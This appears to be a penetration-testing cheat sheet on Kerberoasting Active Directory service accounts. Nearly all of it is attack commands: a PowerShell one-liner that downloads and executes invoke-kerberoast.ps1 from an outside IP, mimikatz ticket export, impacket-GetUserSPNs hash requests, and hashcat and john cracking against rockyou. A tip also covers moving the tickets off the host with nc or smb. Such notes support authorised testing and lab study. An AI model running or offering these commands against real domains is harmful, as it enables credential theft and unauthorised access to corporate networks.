# Ticket manipulations mimi

{% embed url="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/" %}
invoke-kerberoast.ps1 automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat
{% endembed %}

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.132:8080/invoke-kerberoast.ps1'); Invoke-Kerberoast -Domain 'domain.com' | fl"
<strong>
</strong><strong>Import-Module .\invoke-kerberoast.ps1 (or . .\invoke-kerberoast.ps1)
</strong>Invoke-Kerberoast -Domain 'domain.com' | fl
(-Server 'dc01.domain.com')

#with creds
$SecPassword = ConvertTo-SecureString 'Pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('doamin\user.x', $SecPassword)
Invoke-Kerberoast -Credential $Cred -Verbose | fl
</code></pre>

{% embed url="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/" %}

### Request ticket

SPN e.g. `MSSQLSvc/xor-app23.xor.com:1433` `HTTP/CorpWebServer.corp.com`

{% code overflow="wrap" %}
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{SPN}' 

klist
or
sekurlsa::tickets
```
{% endcode %}

### Dump .kirbi for kerberoast (no need admin)

```
.\mimikatz.exe "kerberos::list /export" "exit"
```

{% hint style="info" %}
use scp to transfer / nc binary / [smb](../../general/common-operations-tty-ssh-rbash/file-transfer.md#smb)
{% endhint %}

#### With domain user pwd / hash, dump for kerberoash from kali

{% code overflow="wrap" %}
```

proxychains impacket-GetUserSPNs domain.local/user:"pwd" -dc-ip 10.10.10.10 -request

proxychains impacket-GetUserSPNs domain.local/user -hashes lm:nt -dc-ip 10.10.10.10 -request      
```
{% endcode %}

### kerberoast to crack service ticket cleartext pwd

```
kirbi2john exported.kirbi > johnkirbi.txt

hashcat -m 13100 --force johnkirbi.txt /usr/share/wordlists/rockyou.txt
john /usr/share/wordlists/rockyou.txt johnkirbi.txt --format=krb5tgs
```

```
tgsrepcrack /usr/share/wordlists/rockyou.txt xxxx.kirbi
```
